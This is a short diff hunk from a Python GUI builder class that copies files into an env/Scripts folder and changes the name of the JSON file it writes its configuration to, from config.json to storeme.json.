@@ -818,7 +818,7 @@ class Builder(ctk.CTk):
 			else:
 				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
 
-		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
+		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "storeme.json"), "w", encoding= "utf-8", errors= "ignore") as file:
 			file.write(config)
 
 		clear()
